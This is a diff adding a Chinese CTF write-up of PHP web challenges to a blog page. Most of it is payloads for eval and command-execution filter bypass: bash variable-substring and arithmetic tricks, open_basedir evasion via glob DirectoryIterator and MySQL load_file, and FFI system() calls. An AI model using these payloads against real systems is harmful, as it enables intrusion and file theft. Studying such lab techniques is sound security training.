@@ -108,7 +108,97 @@ web31过滤system,可以用exec,passthru. 过滤cat,可以用tac tail.">
 <p>在php中，post上传文件会在&#x2F;tmp目录下生成一个<code>php??????</code>临时文件(<code>?</code>为随机大小写字母)，在请求结束之后，该临时文件才会被清除</p>
 <p>这样，就可以构造一个请求利用<code>.</code>执行上传的临时文件，如<code>. /???/?????????</code></p>
 <p>利用glob通配符，<code>[@-[]</code>，覆盖所有大写字母，这样就能匹配到该临时文件从而执行</p>
-</section>
+<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>没有过滤$和(()),取反绕过</p>
+<p>通过<code>$(())</code>操作构造出36： <code>$(())</code> ：代表做一次运算，因为里面为空，也表示值为0</p>
+<p><code>$(( ~$(()) )) </code>：对0作取反运算，值为-1</p>
+<p><code>$((      $((~$(()))) $((~$(())))    ))</code>： -1-1，也就是(-1)+(-1)为-2，所以值为-2</p>
+<p><code>$(( ~$(( $((~$(()))) $((~$(()))) )) )) </code>：再对-2做一次取反得到1，所以值为1</p>
+<p>故我们在<code>$(( ~$(( )) ))</code>里面放37个<code>$((~$(())))</code>，得到-37，取反即可得到36:</p>
+<p>?c&#x3D;$((<del>$(($((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))$((<del>$(())))$((</del>$(())))))))</p>
+<h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))</span><br><span class="line">&#123;     </span><br><span class="line">    <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];     </span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$c</span>); &#125;</span><br><span class="line"><span class="keyword">else</span>&#123;   </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>乍一看很简单，但是过滤了很多函数，phpinfo()也过滤了。</p>
+<p>但是highlight没过滤。c&#x3D;highlight_file(‘flag.php’);即可</p>
+<h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p>方法相同。c&#x3D;highlight_file(‘flag.php’);</p>
+<h3 id="web60"><a href="#web60" class="headerlink" title="web60"></a>web60</h3><p>c&#x3D;highlight_file(‘flag.php’);</p>
+<h3 id="web61"><a href="#web61" class="headerlink" title="web61"></a>web61</h3><p>c&#x3D;highlight_file(‘flag.php’);</p>
+<h3 id="web62"><a href="#web62" class="headerlink" title="web62"></a>web62</h3><p>c&#x3D;highlight_file(‘flag.php’);</p>
+<h3 id="web63"><a href="#web63" class="headerlink" title="web63"></a>web63</h3><p>c&#x3D;highlight_file(‘flag.php’);</p>
+<h3 id="web64"><a href="#web64" class="headerlink" title="web64"></a>web64</h3><p>c&#x3D;highlight_file(‘flag.php’);</p>
+<h3 id="web65"><a href="#web65" class="headerlink" title="web65"></a>web65</h3><p>c&#x3D;highlight_file(‘flag.php’);</p>
+<h3 id="web66"><a href="#web66" class="headerlink" title="web66"></a>web66</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=print_r(scandir(&quot;/&quot;));</span><br></pre></td></tr></table></figure>
+
+<p>发现flag在根目录</p>
+<p>c&#x3D;highlight_file(‘&#x2F;flag.txt’);</p>
+<h3 id="web67"><a href="#web67" class="headerlink" title="web67"></a>web67</h3><p>c&#x3D;highlight_file(‘flag.php’);</p>
+<h3 id="web68"><a href="#web68" class="headerlink" title="web68"></a>web68</h3><p>禁用了highlight_file，show_source</p>
+<p>c&#x3D;include(‘&#x2F;flag.txt’);</p>
+<h3 id="web69"><a href="#web69" class="headerlink" title="web69"></a>web69</h3><p>var_dump也过滤了，用var_export(scandir(‘&#x2F;‘))查看目录</p>
+<p>c&#x3D;include(‘&#x2F;flag.txt’);</p>
+<h3 id="web70"><a href="#web70" class="headerlink" title="web70"></a>web70</h3><p>c&#x3D;include(‘&#x2F;flag.txt’);</p>
+<h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">        <span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>ob_get_contents()：获取缓冲区的数据，然后ob_end_clean()清除缓冲区数据，再输出大小写字母数字置换成?的原缓冲区数据，相当于输出半路给你截了，然后衣服给你扒光再放走</p>
+<p>置换操作都是文件包含后面的，终止后面操作，利用die()或者exit()提前结束即可</p>
+<p>c&#x3D;include(‘&#x2F;flag.txt’);exit();</p>
+<h3 id="web72"><a href="#web72" class="headerlink" title="web72"></a>web72</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line">$dir = new DirectoryIterator(&#x27;glob:///*&#x27;);</span><br><span class="line">foreach ($dir as $fileinfo) &#123;</span><br><span class="line">    echo $fileinfo-&gt;getFilename() . &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+
+<p>发现了flag0.txt，但是目录访问受限，去看官方poc，有点涉及到pwn，不太会先放着</p>
+<h3 id="web73"><a href="#web73" class="headerlink" title="web73"></a>web73</h3><p>c&#x3D;$dir &#x3D; new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach ($dir as $fileinfo) {echo $fileinfo-&gt;getFilename() . “\n”;}die();发现了flagc.txt</p>
+<p>c&#x3D;include(‘&#x2F;flagc.txt’);exit();</p>
+<h3 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h3><p>c&#x3D;<br>$dir &#x3D; new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);<br>foreach ($dir as $fileinfo) {<br>    echo $fileinfo-&gt;getFilename() . “\n”;<br>}<br>die();发现了flagx.txt</p>
+<p>c&#x3D;include(‘&#x2F;flagx.txt’);exit();</p>
+<h3 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h3><p>c&#x3D;$dir &#x3D; new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach ($dir as $fileinfo) {echo $fileinfo-&gt;getFilename() . “\n”;}die();</p>
+<p>为什么要用glob协议而不能直接DirectoryIterator(‘&#x2F;‘)？因为该题做了限制只能访问&#x2F;var&#x2F;www&#x2F;html，访问根目录会报错因为没有权限。</p>
+<p>找到flag36.txt。但是无法include</p>
+<p>利用Mysql绕过访问限制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line">$con = mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);</span><br><span class="line">$result = mysqli_query($con, &#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;);</span><br><span class="line">$row = mysqli_fetch_assoc($result);</span><br><span class="line">foreach($row as $c)</span><br><span class="line">	echo($c);</span><br><span class="line">die();</span><br></pre></td></tr></table></figure>
+
+<h3 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h3><p>c&#x3D;$dir &#x3D; new DirectoryIterator(‘glob:&#x2F;&#x2F;&#x2F;*’);foreach ($dir as $fileinfo) {echo $fileinfo-&gt;getFilename() . “\n”;}die();</p>
+<p>c&#x3D;$con &#x3D; mysqli_connect(“localhost”,”root”,”root”);$result &#x3D; mysqli_query($con, ‘select load_file(“&#x2F;flag36d.txt”)’);$row &#x3D; mysqli_fetch_assoc($result);foreach($row as $c)echo($c);die();</p>
+<h3 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h3><p>php7.4版本更新扩展FFI</p>
+<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/ffi.examples-basic.php">PHP: 基础 FFI 用法 - Manual</a>，相当于我们可以api调用c语言的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line">$ffi = FFI::cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$ffi-&gt;system(&quot;whoami&quot;); </span><br></pre></td></tr></table></figure>
+
+<p>调用c的sytem函数执行shell，</p>
+<p>但是这样无输出，为什么呢？当你通过 PHP 的 <code>FFI</code> 执行 <code>system(&quot;whoami&quot;)</code> 时，命令的输出会直接发送到 PHP 进程的标准输出，而不是返回给 PHP 代码本身。因此你看不到任何回显，除非 PHP 进程的输出被捕获或重定向。也就是说，输出内容输出到了linux里，什么输出都没定向到php里，php通过中间件到web端。</p>
+<p>就是虽然标准输出已经定向到php的输出里，但php没让输出</p>
+<p>我们利用重定向的办法读取输出：c&#x3D;$ffi &#x3D; FFI::cdef(“int system(const char *command);”);$ffi-&gt;system(“ls &#x2F; &gt;a”); include “a”;exit;这样写入文件然后包含文件即可。</p>
+<p>根目录有flag36x.txt和readflag，flag36x.txt没有权限，我们读取readflag发现是elf文件，反编译后知道他执行system(‘cat &#x2F;flag36x.txt’)命令。</p>
+<p>运行该文件即可</p>
+<p>payload:c&#x3D;$ffi &#x3D; FFI::cdef(“int system(const char *command);”);$ffi-&gt;system(“&#x2F;readflag &gt;a”); include “a”;exit();</p>
+<h3 id="web118"><a href="#web118" class="headerlink" title="web118"></a>web118</h3><p>后端执行系统命令system，过滤字母数字和大部分符号，但是没过滤$</p>
+<p>绕过新姿势</p>
+<p>${}会解析括号内所有的变量及运算式</p>
+<p>对一个空变量作取反运算echo $((N))像这样会输出0</p>
+<p>echo ${PATH:N}因为N为空变量，所以效果等于echo ${PATH}</p>
+<p>echo ${PATH:~N}则会先对N取反，空字符为0，取反-1，所以效果为输出环境变量的最后一个字符n</p>
+<p>可以通过<code>$&#123;PATH:~N&#125;</code>拿到<code>PATH</code>环境变量的最后一个字符<code>n</code>，如果再拿到一个<code>l</code>，不就可以执行<code>nl</code>了吗</p>
+<p>php web默认目录一般在<code>/var/www/html</code>，而<code>$PWD</code>存储工作目录，<code>$&#123;PWD:~N&#125;</code>就可以拿到字符<code>l</code></p>
+<p>flag.php可以用问号匹配？？？？？？？？</p>
+<p>payload:${PATH:<del>N}${PWD:</del>N} ????????</p>
+<h3 id="web119"><a href="#web119" class="headerlink" title="web119"></a>web119</h3><p>和web118相比，多过滤了path。</p>
+<p>我们只能用${PWD}来绕过，${}里变量前加#号可以返回变量字符串长度。</p>
+<p>查看环境变量发现变量SHLVL值为1，利用他来构造命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;  意思是取pwd第一个字符，即  /</span><br></pre></td></tr></table></figure>
+
+<p>我们要构造nl命令，但是nl在&#x2F;usr&#x2F;bin&#x2F;nl中，我们要构造&#x2F;usr&#x2F;bin&#x2F;nl flag.php</p>
+<p>linux里文件路径可以用?通配符来查找所以我们构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?$&#123;PWD:~N&#125; ????????</span><br></pre></td></tr></table></figure>
+
+<p>即可</p>
+<h3 id="web120"><a href="#web120" class="headerlink" title="web120"></a>web120</h3><p>又多过滤了path</p>
+<p>其实linux里#也是一个变量，$就是1，所以把上题的SHLVL换成#就行</p>
+<p>code&#x3D;${PWD::$}???${PWD::$}???${PWD::$}?${PWD:~N} ????????</p>
+<h3 id="web121"><a href="#web121" class="headerlink" title="web121"></a>web121</h3><p>cat命令在&#x2F;usr&#x2F;bin&#x2F;cat</p>
+<p>code&#x3D;${PWD::$}???${PWD::$}??${PWD:$$} ????????</p>
+<p>构造&#x2F;bin&#x2F;cat命令 因为t在&#x2F;var&#x2F;www&#x2F;html中t刚好在第10位</p>
+<h3 id="web122"><a href="#web122" class="headerlink" title="web122"></a>web122</h3><p>pwd禁了，但是home放出来了，&lt;也放了。</p>
+<p><code>&lt;A;</code>构造异常指令，使得退出状态码为1，而<code>$?</code>值为最后命令的退出状态，0表示没有错误，其他表示有错误</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=&lt;A;$&#123;HOME::$?&#125;???$&#123;HOME::$?&#125;?????$&#123;RANDOM::$?&#125; ????????</span><br></pre></td></tr></table></figure>
+
+<p>payload的意思是利用${RANDOM::$?}来截取随机数的首位数，当为4的时候，即可执行&#x2F;bin&#x2F;base64 flag.php</p>
+<h3 id="web124"><a href="#web124" class="headerlink" title="web124"></a>web124</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;);&amp;abs=system&amp;acos=ls</span><br><span class="line">c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));$$pi&#123;abs&#125;($$pi&#123;acos&#125;);&amp;abs=system&amp;acos=tac flag.php</span><br></pre></td></tr></table></figure></section>
     
         
         <h2 class="footline">
